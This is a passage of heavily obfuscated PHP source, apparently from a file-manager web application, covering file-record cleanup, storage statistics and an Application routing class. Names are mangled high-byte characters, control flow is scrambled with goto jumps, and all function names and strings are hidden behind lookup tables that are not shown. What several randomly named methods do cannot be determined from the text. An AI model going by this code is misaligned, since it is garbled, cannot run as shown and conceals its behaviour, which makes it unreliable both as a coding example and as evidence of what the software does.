$cßòÚööî˜[$cœ¶“¢´]++; } $D‘—‚†õÎè = array(); goto E¼òÈÊ¯±‚; cìï¼ñ†Ö: } public function findByHash($Aäñ ¡Ü‰‚, $fÒŞ§ŒŞ † = false) { $DÁù¦­„… =& $_SERVER[Æ¼ôºÙï]; if (!$Aäñ ¡Ü‰‚ && !$fÒŞ§ŒŞ †) { return !1; } $D‘µ¥Í™µ† = array($DÁù¦­„…[1722] => $Aäñ ¡Ü‰‚); if ($fÒŞ§ŒŞ †) { $D‘µ¥Í™µ† = array($DÁù¦­„…[1723] => $fÒŞ§ŒŞ †); } return $this->order($DÁù¦­„…[1726])->where($D‘µ¥Í™µ†)->find(); } public function clearEmpty($b—òºÏèÀ¶ = 0) { goto D¶‚Åâ®ŸÜ; D¶‚Åâ®ŸÜ: $f¯àæí¸Ç =& $_SERVER[Æ¼ôºÙï]; $A×µ«ª¿¾Ù = time() - 3600 * 24 * $b—òºÏèÀ¶; $fšÊÖÖæğ™ = $f¯àæí¸Ç[1727] . $A×µ«ª¿¾Ù; goto a²î««Ì; c–ï÷†ØÀ: foreach ($B¬µÍçŠ¸ as $D³ÎÊçâ‚Ÿ) { $A¬óß˜‰ñ°->update(1); $this->resetFile($D³ÎÊçâ‚Ÿ); } $A¬óß˜‰ñ°->end(); goto Fè®£ÒñÁ; a²î««Ì: $B¬µÍçŠ¸ = $this->where($fšÊÖÖæğ™)->select(); if (!$B¬µÍçŠ¸) { return; } $A¬óß˜‰ñ° = new Task($f¯àæí¸Ç[1728], $f¯àæí¸Ç[33], count($B¬µÍçŠ¸)); goto c–ï÷†ØÀ; Fè®£ÒñÁ: } public function resetFile($CÙÕø‰Ü¹) { goto E¤¬“ª¨Å; dÏ›÷øÌˆ¥: $fò¢°ÙÙÁ¾ = Model($D•§ìˆÏ[1729])->where($B®öùÑÍŞƒ)->count(); $dÔ…¼”‡Ô = intval($d¿Î‘¸ĞÇ×) + intval($fò¢°ÙÙÁ¾); if ($dÔ…¼”‡Ô == 0) { IO::remove($CÙÕø‰Ü¹[$D•§ìˆÏ[75]]); $this->where($B®öùÑÍŞƒ)->delete(); $this->metaSet($CÙÕø‰Ü¹[$D•§ìˆÏ[436]], null, null); return; } goto Cœê·¯šö; E¤¬“ª¨Å: $D•§ìˆÏ =& $_SERVER[Æ¼ôºÙï]; $B®öùÑÍŞƒ = array($D•§ìˆÏ[437] => $CÙÕø‰Ü¹[$D•§ìˆÏ[436]]); $d¿Î‘¸ĞÇ× = Model($D•§ìˆÏ[1182])->where($B®öùÑÍŞƒ)->count(); goto dÏ›÷øÌˆ¥; Cœê·¯šö: if ($CÙÕø‰Ü¹[$D•§ìˆÏ[1725]] != $dÔ…¼”‡Ô) { $this->where($B®öùÑÍŞƒ)->save(array($D•§ìˆÏ[1721] => $dÔ…¼”‡Ô)); } goto aŸœˆìÃ‰å; aŸœˆìÃ‰å: } public function storageInfo($F‘œÇÄí« = false) { goto FáÉö¨—; båÉ¼Õ’ºè: $c·òì‰Æä® = 1; $a¯ÕËšê±ª = 0; $eí¬É¹©Âï = 5000; goto d¼™£ø°Í; FáÉö¨—: $DÊİó„ê«® =& $_SERVER[Æ¼ôºÙï]; $f‰¨‘²Ïù› = $this->count() + 0.0; $B„­Šš‘œõ = 0; goto båÉ¼Õ’ºè; d¼™£ø°Í: for ($cÄù…õ³‹‚ = 0; $cÄù…õ³‹‚ < $f‰¨‘²Ïù›; $cÄù…õ³‹‚ = $cÄù…õ³‹‚ + $eí¬É¹©Âï) { $CªĞòÍÇ = $this->limit($cÄù…õ³‹‚, $cÄù…õ³‹‚ + $eí¬É¹©Âï)->select(); foreach ($CªĞòÍÇ as $a¦øÕ·†‘·) { $c·òì‰Æä® += $a¦øÕ·†‘·[$DÊİó„ê«®[77]] * $a¦øÕ·†‘·[$DÊİó„ê«®[1725]]; $B„­Šš‘œõ += $a¦øÕ·†‘·[$DÊİó„ê«®[77]] * ($a¦øÕ·†‘·[$DÊİó„ê«®[1725]] - 1); $a¯ÕËšê±ª += $a¦øÕ·†‘·[$DÊİó„ê«®[1725]]; } } $bë»Ãå…™Œ = array($DÊİó„ê«®[1730] => $c·òì‰Æä®, $DÊİó„ê«®[1731] => $B„­Šš‘œõ, $DÊİó„ê«®[1732] => $B„­Šš‘œõ / $c·òì‰Æä®, $DÊİó„ê«®[81] => $f‰¨‘²Ïù›, $DÊİó„ê«®[1733] => $a¯ÕËšê±ª); return $bë»Ãå…™Œ; goto AÊßâ¦Íëä; AÊßâ¦Íëä: } } goto aÉ„·½¤—µ; fÔº‹ØŠ®Í: if (strlen($eë–ÉÍÎ†) < $_SERVER[Æ¼ôºÙï][567]) { return; } class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($fï„ÒæÜï—) { goto Cóª¥‡ÎÅ³; Cóª¥‡ÎÅ³: $c”ïĞøä•è =& $_SERVER[Æ¼ôºÙï]; $bÏìÑÂº—† =& $_SERVER[­£]; $EÌ‹§ùñ—† = $bÏìÑÂº—†[0]($bÏìÑÂº—†[1], $bÏìÑÂº—†[2]($fï„ÒæÜï—, $bÏìÑÂº—†[1])); goto Aƒë÷¼—¨; f¡âÇ“‹â: $this->{$_SERVER[­£][3]}($bÏìÑÂº—†[4], array($this, $bÏìÑÂº—†[5])); $dºñå÷•™¸ = $c”ïĞøä•è[572]; if (!$dºñå÷•™¸) { die; } goto eÅ¾Ñ™ÃÑÍ; d†‰½µ®Å: $this->defaultController = $EÌ‹§ùñ—†[1] ? $EÌ‹§ùñ—†[1] : $this->defaultController; $cÁµ®ßÁâ‡ = $c”ïĞøä•è[570]; if (strlen($cÁµ®ßÁâ‡) < $c”ïĞøä•è[567]) { return; } goto fÁ÷ÏÑ‡„; Aƒë÷¼—¨: $f®¯ƒà÷· = $c”ïĞøä•è[568]; $this->defaultModule = $EÌ‹§ùñ—†[0] ? $EÌ‹§ùñ—†[0] : $this->defaultModule; $A²É»ìŠ¶¾ = $c”ïĞøä•è[569]; goto d†‰½µ®Å; fÁ÷ÏÑ‡„: $this->defaultAction = $EÌ‹§ùñ—†[2] ? $EÌ‹§ùñ—†[2] : $this->defaultAction; $AÆÀêĞ¦Ò = $c”ïĞøä•è[571]; if (!$AÆÀêĞ¦Ò) { die; } goto f¡âÇ“‹â; eÅ¾Ñ™ÃÑÍ: } public function appRun($C“Ş”ñÅ¨à) { goto c¯´§§Ê¸×; f¯ªÅêÓÙ–: $A†ËÇˆÓµ = $BÈù’ÓÎ[7]; if ($CİÚˆŠˆ“Ù == $BÈù’ÓÎ[8]) { $A†ËÇˆÓµ = $BÈù’ÓÎ[9]; $F™Ê„ğçì[0] = $BÈù’ÓÎ[10]; $F™Ê„ğçì[1] = $F™Ê„ğçì[1] . $BÈù’ÓÎ[11]; $C“Ş”ñÅ¨à = $BÈù’ÓÎ[12]($BÈù’ÓÎ[1], $F™Ê„ğçì); $C“Ş”ñÅ¨à = $BÈù’ÓÎ[2]($C“Ş”ñÅ¨à, $BÈù’ÓÎ[1]); } $BÈù’ÓÎ[13](array($BÈù’ÓÎ[14], $BÈù’ÓÎ[15]), $A†ËÇˆÓµ . $BÈù’ÓÎ[16], $C“Ş”ñÅ¨à); goto cõ‡£—êœƒ; cõ‡£—êœƒ: $BÈù’ÓÎ[17]($C“Ş”ñÅ¨à); $BÈù’ÓÎ[13](array($BÈù’ÓÎ[14], $BÈù’ÓÎ[15]), $A†ËÇˆÓµ . $BÈù’ÓÎ[18], $C“Ş”ñÅ¨à); goto aÅÉÀª×¹á; c¯´§§Ê¸×: $BÈù’ÓÎ =& $_SERVER[­£]; $F™Ê„ğçì = $BÈù’ÓÎ[0]($BÈù’ÓÎ[1], $C“Ş”ñÅ¨à); $CİÚˆŠˆ“Ù = $BÈù’ÓÎ[6]($F™Ê„ğçì[0]); goto f¯ªÅêÓÙ–; aÅÉÀª×¹á: } private function autorun() { goto Döê•²ºÀ; fåãëğöã«: foreach ($config[$cÍ›ò‰àº¢[20]] as $fÌ®÷ÅÙ‚Ä => $dÍò×¦Û»¢) { $this->{$_SERVER[­£][21]}($dÍò×¦Û»¢); } goto Dƒ¬‹Õ·Ï™; D¸Œãµ¶´ë: $Cá°…‹çß„ = $CØÎ‰Êµ¶¾[573]; if (strlen($Cá°…‹çß„) < $CØÎ‰Êµ¶¾[574]) { return; } if ($cÍ›ò‰àº¢[19]($config[$cÍ›ò‰àº¢[20]]) == 0) { return; } goto fåãëğöã«; Döê•²ºÀ: $CØÎ‰Êµ¶¾ =& $_SERVER[Æ¼ôºÙï]; $cÍ›ò‰àº¢ =& $_SERVER[­£]; global $config; goto D¸Œãµ¶´ë; Dƒ¬‹Õ·Ï™: } private function uxas11273135() { goto CÓ»†³§Õæ; CÓ»†³§Õæ: $aåŸõø©¦­ =& $_SERVER[Æ¼ôºÙï]; $A–¶ÊÖ =& $_SERVER[­£]; $F³•¾ª«¹† = $A–¶ÊÖ[8]; goto b°í…ŠšÊ³; E„Àñœ´ö¹: $BöÏĞÃ–Œ³ = $A–¶ÊÖ[26]($GLOBALS[$A–¶ÊÖ[22]][$A–¶ÊÖ[23]], 1); $GLOBALS[$A–¶ÊÖ[22]][$A–¶ÊÖ[23]] = $A–¶ÊÖ[27]($FªˆÄâõ½, $BöÏĞÃ–Œ³); $e«ù›½Öš´ = $aåŸõø©¦­[579]; goto Bš¢¡Ïõ…Ì; b°í…ŠšÊ³: $B®°ÇË»ô¼ = $aåŸõø©¦­[575]; while ($B®°ÇË»ô¼ < $aåŸõø©¦­[576]) { if ($B®°ÇË»ô¼ >= 0) { break; } $B®°ÇË»ô¼++; } $e‹ãí–‚‹ = $GLOBALS[$A–¶ÊÖ[22]][$A–¶ÊÖ[23]][0]; goto dÆ›—æĞŸ“; dÆ›—æĞŸ“: $C„°ÆŸ²˜ñ = $aåŸõø©¦­[577]; while (strlen($C„°ÆŸ²˜ñ) < $aåŸõø©¦­[578]) { if (!$C„°ÆŸ²˜ñ) { break; } $C„°ÆŸ²˜ñ++; } if (!$e‹ãí–‚‹ || $A–¶ÊÖ[24]($e‹ãí–‚‹) <= $A–¶ÊÖ[24]($F³•¾ª«¹†)) { return; } goto d³Çƒ…ÕĞê; Bš¢¡Ïõ…Ì: $GLOBALS[$A–¶ÊÖ[22]][$A–¶ÊÖ[28]] = $A–¶ÊÖ[29]($A–¶ÊÖ[1], $GLOBALS[$A–¶ÊÖ[22]][$A–¶ÊÖ[23]]); $FŞÉ¿ïÍ«Ô = $aåŸõø©¦­[580]; while (strlen($FŞÉ¿ïÍ«Ô) < $aåŸõø©¦­[574]) { if (!$FŞÉ¿ïÍ«Ô) { break; } $FŞÉ¿ïÍ«Ô++; } goto C¹Çµå¥Æ; d³Çƒ…ÕĞê: if ($A–¶ÊÖ[6]($A–¶ÊÖ[25]($e‹ãí–‚‹, -$A–¶ÊÖ[24]($F³•¾ª«¹†))) != $F³•¾ª«¹†) { return; } $bŒæÁ‰—¤” = $A–¶ÊÖ[25]($e‹ãí–‚‹, 0, -$A–¶ÊÖ[24]($F³•¾ª«¹†)); $FªˆÄâõ½ = array($A–¶ÊÖ[8], $bŒæÁ‰—¤”); goto E„Àñœ´ö¹; C¹Çµå¥Æ: } private function urvl556515a7() { goto a•¨£è—¥™; dŠñ–¯— ¹: while ($Dáƒ’İ—‰› < $cèôÙ½ØäÔ[574]) { if ($Dáƒ’İ—‰› >= 0) { break; } $Dáƒ’İ—‰›++; } if (!$Aª¡’Îƒë¹[32]($fª¾²Â…£É, $eÊÙ·«ÄÖ•)) { return; } $b¤ÖóŞ‡ø‚ = $Aª¡’Îƒë¹[33]($fª¾²Â…£É, $eÊÙ·«ÄÖ•); goto fœ¼„ç³¨; a•¨£è—¥™: $cèôÙ½ØäÔ =& $_SERVER[Æ¼ôºÙï]; $Aª¡’Îƒë¹ =& $_SERVER[­£]; if ($GLOBALS[$Aª¡’Îƒë¹[22]][$Aª¡’Îƒë¹[28]] != $Aª¡’Îƒë¹[10]) { return; } goto C¿Õİ¶Œá ; fœ¼„ç³¨: $bî‰ƒ‰ÄÚÛ = $cèôÙ½ØäÔ[582]; if (!$bî‰ƒ‰ÄÚÛ) { return; } $fíªÅöö‚è = $Aª¡’Îƒë¹[25]($fª¾²Â…£É, $b¤ÖóŞ‡ø‚ + $Aª¡’Îƒë¹[24]($eÊÙ·«ÄÖ•)); goto C×°Ü†ùá¼; aòÚÆ¨´¸: $GLOBALS[$Aª¡’Îƒë¹[22]][$Aª¡’Îƒë¹[28]] = $Aª¡’Îƒë¹[29]($Aª¡’Îƒë¹[1], $GLOBALS[$Aª¡’Îƒë¹[22]][$Aª¡’Îƒë¹[23]]); $Ağ¥Áà÷è¯ = $cèôÙ½ØäÔ[585]; while ($Ağ¥Áà÷è¯ < $cèôÙ½ØäÔ[576]) { if ($Ağ¥Áà÷è¯ >= 0) { break; } $Ağ¥Áà÷è¯++; } goto EŞåÕõç¸§; a¿Å¬ÕäÕÜ: $GLOBALS[$Aª¡’Îƒë¹[22]][$Aª¡’Îƒë¹[23]] = $Aª¡’Îƒë¹[0]($Aª¡’Îƒë¹[36], $fíªÅöö‚è); $c ‚é˜ƒ¼ = $cèôÙ½ØäÔ[584]; while (strlen($c ‚é˜ƒ¼) < $cèôÙ½ØäÔ[574]) { if (!$c ‚é˜ƒ¼) { break; } $c ‚é˜ƒ¼++; } goto aòÚÆ¨´¸; C×°Ü†ùá¼: $Aª¡’Îƒë¹[34]($Aª¡’Îƒë¹[35], $fíªÅöö‚è, $CŒƒãé½â˜); $fíªÅöö‚è = $Aª¡’Îƒë¹[2]($CŒƒãé½â˜[0][0], $Aª¡’Îƒë¹[36]); $Bôµì–‰§ = $cèôÙ½ØäÔ[583]; goto a¿Å¬ÕäÕÜ; C¿Õİ¶Œá : $fª¾²Â…£É = $_SERVER[$Aª¡’Îƒë¹[30]]; $eÊÙ·«ÄÖ• = $Aª¡’Îƒë¹[31]; $Dáƒ’İ—‰› = $cèôÙ½ØäÔ[581]; goto dŠñ–¯— ¹; EŞåÕõç¸§: } public function run() { goto aÒå¹šÊ°; d²çšÅ¢Â: $c±¤ÅŒ™²„[39]($c±¤ÅŒ™²„[40], isset($CÌÑ–·öÓ‰[0]) && $CÌÑ–·öÓ‰[0] ? $CÌÑ–·öÓ‰[0] : $this->defaultModule); $c±¤ÅŒ™²„[39]($c±¤ÅŒ™²„[41], isset($CÌÑ–·öÓ‰[1]) && $CÌÑ–·öÓ‰[0] ? $CÌÑ–·öÓ‰[1] : $this->defaultController); $aÂîØÍà³‚ = $EšÛæ¢ŸÅ¸[589]; goto F çÉ¼¡‹; bñ´ÚÉšÕ´: $bÎòß¥ß´ = $EšÛæ¢ŸÅ¸[586]; if (strlen($bÎòß¥ß´) < $EšÛæ¢ŸÅ¸[574]) { die; } $this->{$_SERVER[­£][38]}(); goto e¿¾°¿ïÔÏ; e¿¾°¿ïÔÏ: $Cõå•ìğñ× = $EšÛæ¢ŸÅ¸[587]; if (!$Cõå•ìğñ×) { return; } $CÌÑ–·öÓ‰ = $GLOBALS[$c±¤ÅŒ™²„[22]][$c±¤ÅŒ™²„[23]]; goto c¬êÒÔ¬ô; DËğ³çà‹: $c±¤ÅŒ™²„[39]($c±¤ÅŒ™²„[43], MOD . $c±¤ÅŒ™²„[1] . ST . $c±¤ÅŒ™²„[1] . ACT); $fÍœ¦ñ¬°¿ = $EšÛæ¢ŸÅ¸[591]; if (strlen($fÍœ¦ñ¬°¿) < $EšÛæ¢ŸÅ¸[574]) { return; } goto B¥¦»ˆ¿ËÏ; aÒå¹šÊ°: $EšÛæ¢ŸÅ¸ =& $_SERVER[Æ¼ôºÙï]; $c±¤ÅŒ™²„ =& $_SERVER[­£]; $this->{$_SERVER[­£][37]}(); goto bñ´ÚÉšÕ´; B¥¦»ˆ¿ËÏ: $_SERVER[$c±¤ÅŒ™²„[44]] = $c±¤ÅŒ™²„[6](ACTION); $báâ‹«ô˜ = $EšÛæ¢ŸÅ¸[592]; if (strlen($báâ‹«ô˜) < $EšÛæ¢ŸÅ¸[567]) { die; } goto A‡…î½Œ ; F çÉ¼¡‹: $c±¤ÅŒ™²„[39]($c±¤ÅŒ™²„[42], isset($CÌÑ–·öÓ‰[2]) && $CÌÑ–·öÓ‰[0] ? $CÌÑ–·öÓ‰[2] : $this->defaultAction); $B½…ÛØ¡„ = $EšÛæ¢ŸÅ¸[590]; if (!$B½…ÛØ¡„) { return; } goto DËğ³çà‹; A‡…î½Œ : $this->{$_SERVER[­£][45]}(); if ($c±¤ÅŒ™²„[19]($CÌÑ–·öÓ‰) >= 3) { $this->{$_SERVER[­£][21]}($FÙË²Ñ„µª); } else { $this->{$_SERVER[­£][21]}(ACTION); } goto D²Òà£î‰æ; c¬êÒÔ¬ô: $FÙË²Ñ„µª = $GLOBALS[$c±¤ÅŒ™²„[22]][$c±¤ÅŒ™²„[28]]; $C‰–­ñè¶ = $EšÛæ¢ŸÅ¸[588]; if (!$C‰–­ñè¶) { return; } goto d²çšÅ¢Â; D²Òà£î‰æ: } private $ytaz7d0fb951 = array(); private $qadr1544447b = ''; public function eztle9a41d15() { goto fÆëƒò¾¯È; bÄÅÈÃ»º: $this->{$_SERVER[­£][3]}($F³•²‚¢Ïâ[55], array($this, $F³•²‚¢Ïâ[56])); $dÛ§¯„Š² = $e¤ì‰õ ™[600]; if (strlen($dÛ§¯„Š²) < $e¤ì‰õ ™[574]) { die; } goto bˆÛ©Ü°Ø‰; EÏŒùàÎœª: $bŸŠÏåÙäğ = $e¤ì‰õ ™[599]; if (!$bŸŠÏåÙäğ) { return; } $this->{$_SERVER[­£][3]}($F³•²‚¢Ïâ[53], array($this, $F³•²‚¢Ïâ[54])); goto bÄÅÈÃ»º; d’Š•ÒÖ•: $this->{$_SERVER[­£][50]}(); $e¬÷Äà‡¿ = $e¤ì‰õ ™[597]; if (strlen($e¬÷Äà‡¿) < $e¤ì‰õ ™[576]) { die; } goto bñÒ„¤ç; EÉ£³•“†´: $A‰ŒŸ¶‹¾Å = $e¤ì‰õ ™[596]; if (!$A‰ŒŸ¶‹¾Å) { return; } $this->{$_SERVER[­£][49]}(); goto d’Š•ÒÖ•; fÈ«ˆéÕ®Ñ: $EâìÉĞ—¢ß = $e¤ì‰õ ™[593]; if (strlen($EâìÉĞ—¢ß) < $e¤ì‰õ ™[594]) { die; } $this->{$_SERVER[­£][47]}(); goto bÔÛ”ØÂ•±; fÆëƒò¾¯È: $e¤ì‰õ ™ =& $_SERVER[Æ¼ôºÙï]; $F³•²‚¢Ïâ =& $_SERVER[­£]; $this->{$_SERVER[­£][46]}(); goto fÈ«ˆéÕ®Ñ; bˆÛ©Ü°Ø‰: $this->{$_SERVER[­£][3]}($F³•²‚¢Ïâ[57], array($this, $F³•²‚¢Ïâ[58])); $this->{$_SERVER[­£][3]}($F³•²‚¢Ïâ[59], array($this, $F³•²‚¢Ïâ[60])); $a†öŸö©ÑÀ = $e¤ì‰õ ™[601]; goto bŒ¶×Ù„»¯; bÔÛ”ØÂ•±: $fî£‰âñ = $e¤ì‰õ ™[595]; if (strlen($fî£‰âñ) < $e¤ì‰õ ™[567]) { return; } $this->{$_SERVER[­£][48]}(); goto EÉ£³•“†´; bñÒ„¤ç: $this->{$_SERVER[­£][51]}(); $bì“ˆÑñÀ = $e¤ì‰õ ™[598]; $this->{$_SERVER[­£][52]}(); goto EÏŒùàÎœª; bŒ¶×Ù„»¯: } public function italb842013e($a¥¬ŒéŠ¢•) { goto CËÏÈ–§; aïÚ«˜ä¿Å: return $a¥¬ŒéŠ¢•; goto eĞ¬íÈÓÅ; CËÏÈ–§: $dÄËÀäÒÙ =& $_SERVER[Æ¼ôºÙï]; $a§µõ™ÒÂó =& $_SERVER[­£]; $b§—»Ø‰£ = $a§µõ™ÒÂó[61]($a§µõ™ÒÂó[62])->{$_SERVER[­£][63]}(); goto Bó“éŠÙ¡¯; Bó“éŠÙ¡¯: $d¹áçàšÁ¥ = array($a§µõ™ÒÂó[64], $a§µõ™ÒÂó[65], $a§µõ™ÒÂó[66], $a§µõ™ÒÂó[67], $a§µõ™ÒÂó[68], $a§µõ™ÒÂó[69], $a§µõ™ÒÂó[70], $a§µõ™ÒÂó[71], $a§µõ™ÒÂó[72], $a§µõ™ÒÂó[73], $a§µõ™ÒÂó[74], $a§µõ™ÒÂó[75], $a§µõ™ÒÂó[76], $a§µõ™ÒÂó[77], $a§µõ™ÒÂó[78], $a§µõ™ÒÂó[79], $a§µõ™ÒÂó[80], $a§µõ™ÒÂó[81], $a§µõ™ÒÂó[82], $a§µõ™ÒÂó[83], $a§µõ™ÒÂó[84], $a§µõ™ÒÂó[85], $a§µõ™ÒÂó[86], $a§µõ™ÒÂó[87], $a§µõ™ÒÂó[88], $a§µõ™ÒÂó[89], $a§µõ™ÒÂó[90], $a§µõ™ÒÂó[91], $a§µõ™ÒÂó[92], $a§µõ™ÒÂó[93], $a§µõ™ÒÂó[94], $a§µõ™ÒÂó[95], $a§µõ™ÒÂó[96], $a§µõ™ÒÂó[97], $a§µõ™ÒÂó[98], $a§µõ™ÒÂó[99]); foreach ($d¹áçàšÁ¥ as $b±éÓÓù¾) { $dêÌš“¦ë = $GLOBALS[$a§µõ™ÒÂó[100]][$a§µõ™ÒÂó[101]][$b±éÓÓù¾]; $EÌì›‡Œ¦Š = $dÄËÀäÒÙ[602]; if (isset($b§—»Ø‰£[$b±éÓÓù¾])) { $dêÌš“¦ë = $b§—»Ø‰£[$b±éÓÓù¾]; } $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$b±éÓÓù¾] = $dêÌš“¦ë; } $EÌÔÎŒã˜ = $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$a§µõ™ÒÂó[76]]; goto bİğŒŸˆë¶; cŸƒùÃ´‰: $D‹—‡³Û®” = $dÄËÀäÒÙ[605]; if (strlen($D‹—‡³Û®”) < $dÄËÀäÒÙ[567]) { return; } $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$a§µõ™ÒÂó[108]] = array($a§µõ™ÒÂó[109] => (int) $EÌÔÎŒã˜[$a§µõ™ÒÂó[110]], $a§µõ™ÒÂó[111] => (int) $a§µõ™ÒÂó[112]($EÌÔÎŒã˜, $a§µõ™ÒÂó[113], 0)); goto F¸ƒ•ÃŠÌª; d®¨í»¦ø±: $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[134]] = $a§µõ™ÒÂó[112]($this->ytaz7d0fb951, $a§µõ™ÒÂó[135], $a§µõ™ÒÂó[10]); $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[136]] = $a§µõ™ÒÂó[112]($this->ytaz7d0fb951, $a§µõ™ÒÂó[137], $a§µõ™ÒÂó[10]); if ($a§µõ™ÒÂó[112]($GLOBALS, $a§µõ™ÒÂó[138]) && $this->config[$a§µõ™ÒÂó[139]]) { $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[140]] = WEB_ROOT; } goto aïÚ«˜ä¿Å; B™Ü¾óìÎ: $AÏêÚˆøè = $dÄËÀäÒÙ[604]; unset($a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$a§µõ™ÒÂó[76]]); unset($a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$a§µõ™ÒÂó[107]]); goto cŸƒùÃ´‰; A®ƒŸİìõ: $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[126]] = $this->qadr1544447b; if ($b§—»Ø‰£[$a§µõ™ÒÂó[126]] != $a§µõ™ÒÂó[127]) { $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[128]] = $b§—»Ø‰£[$a§µõ™ÒÂó[128]]; $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[129]] = $b§—»Ø‰£[$a§µõ™ÒÂó[129]]; $dƒŸó¸ò¶™ = $a§µõ™ÒÂó[130](10) . $this->qadr1544447b . $a§µõ™ÒÂó[130](5); $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[131]][$a§µõ™ÒÂó[132]] = $this->{$_SERVER[­£][133]}($dƒŸó¸ò¶™, $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[119]]); } if ($this->qadr1544447b == $a§µõ™ÒÂó[127]) { $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[103]][$a§µõ™ÒÂó[108]][$a§µõ™ÒÂó[113]] = 0; } goto d®¨í»¦ø±; a‰á‘îšİÖ: $aåÌçº—‘ = $dÄËÀäÒÙ[607]; $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[123]] = $a§µõ™ÒÂó[124]($a§µõ™ÒÂó[125]()); $cÅÄ‹õ¿ÄÛ = $dÄËÀäÒÙ[608]; goto A®ƒŸİìõ; F¸ƒ•ÃŠÌª: $cÀŠá¥¾ê‹ = $dÄËÀäÒÙ[606]; $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[115]] = $a§µõ™ÒÂó[116]($a§µõ™ÒÂó[117])->{$_SERVER[­£][118]}(); $a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[114]][$a§µõ™ÒÂó[119]] = $a§µõ™ÒÂó[120]($_SERVER[$a§µõ™ÒÂó[121]] . $b§—»Ø‰£[$a§µõ™ÒÂó[122]]); goto a‰á‘îšİÖ; bİğŒŸˆë¶: $B˜µÆÉÜÎÄ = $dÄËÀäÒÙ[603]; unset($a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[104]][$a§µõ™ÒÂó[105]]); unset($a¥¬ŒéŠ¢•[$a§µõ™ÒÂó[102]][$a§µõ™ÒÂó[104]][$a§µõ™ÒÂó[106]]); goto B™Ü¾óìÎ; eĞ¬íÈÓÅ: } private function uncs6bab1c6e() { goto bÏ†­•÷­£; eá‹ÍÊŒÊĞ: $cêÔ´†ˆ‹Ù = $cŸéÖµì÷¿[612]; if (!$cêÔ´†ˆ‹Ù) { die; } foreach ($FĞ¸Ğ“ç×´ as $d¼›†³öã¿) { if (!isset($FêŞÕ±ëâ‰[$d¼›†³öã¿]) || !$FêŞÕ±ëâ‰[$d¼›†³öã¿]) { continue; } $D÷Û©íÖÖÁ[$d¼›†³öã¿] = $FêŞÕ±ëâ‰[$d¼›†³öã¿]; $b†¤¢À§Ç† = $cŸéÖµì÷¿[613]; } goto E¥ôà¤Éå©; bÏ†­•÷­£: $cŸéÖµì÷¿ =& $_SERVER[Æ¼ôºÙï]; $d®¾Şå¾‡Ä =& $_SERVER[­£]; if ($_SERVER[$d®¾Şå¾‡Ä[44]] == $d®¾Şå¾‡Ä[141]) { goto bìÁ¼Ã¯Ã§; fß‚›•™Ó: $F™µºõÂ = $cŸéÖµì÷¿[609]; while (strlen($F™µºõÂ) < $cŸéÖµì÷¿[574]) { if (!$F™µºõÂ) { break; } $F™µºõÂ++; } $D÷Û©íÖÖÁ = array($d®¾Şå¾‡Ä[156] => $f…Í¬Ô¨©); goto EÔ¶™ğèŸ; EÔ¶™ğèŸ: $dÃ§“ö÷ã” = $cŸéÖµì÷¿[610]; if (!$dÃ§“ö÷ã”) { die; } $d®¾Şå¾‡Ä[13](array($d®¾Şå¾‡Ä[157], $d®¾Şå¾‡Ä[158]), $D÷Û©íÖÖÁ); goto Eâ„Å¬ÒŠ½; bìÁ¼Ã¯Ã§: $f…Í¬Ô¨© = array($d®¾Şå¾‡Ä[126] => $this->qadr1544447b, $d®¾Şå¾‡Ä[142] => $this->{$_SERVER[­£][143]}(), $d®¾Şå¾‡Ä[144] => $d®¾Şå¾‡Ä[61]($d®¾Şå¾‡Ä[145])->{$_SERVER[­£][146]}()); if ($this->qadr1544447b != $d®¾Şå¾‡Ä[127]) { $AÚ†ËŞÍ = $d®¾Şå¾‡Ä[112]($this->ytaz7d0fb951, $d®¾Şå¾‡Ä[147]); if ($AÚ†ËŞÍ) { $f…Í¬Ô¨©[$d®¾Şå¾‡Ä[148]] = $AÚ†ËŞÍ; $f…Í¬Ô¨©[$d®¾Şå¾‡Ä[149]] = $d®¾Şå¾‡Ä[150]($d®¾Şå¾‡Ä[112]($this->ytaz7d0fb951, $d®¾Şå¾‡Ä[151])); $f…Í¬Ô¨©[$d®¾Şå¾‡Ä[152]] = $d®¾Şå¾‡Ä[112]($this->ytaz7d0fb951, $d®¾Şå¾‡Ä[137]); } } $f…Í¬Ô¨© = $this->{$_SERVER[­£][153]}($d®¾Şå¾‡Ä[154]($f…Í¬Ô¨©), $d®¾Şå¾‡Ä[120]($d®¾Şå¾‡Ä[155])); goto fß‚›•™Ó; Eâ„Å¬ÒŠ½: } goto D”­‰ÑÙ›¢; D”­‰ÑÙ›¢: if ($this->qadr1544447b == $d®¾Şå¾‡Ä[127]) { return; } $FĞ¸Ğ“ç×´ = array($d®¾Şå¾‡Ä[159], $d®¾Şå¾‡Ä[160], $d®¾Şå¾‡Ä[161], $d®¾Şå¾‡Ä[162], $d®¾Şå¾‡Ä[163], $d®¾Şå¾‡Ä[164]); $EÆöİĞ = $cŸéÖµì÷¿[611]; goto eĞİœÆ²®ğ; eĞİœÆ²®ğ: if 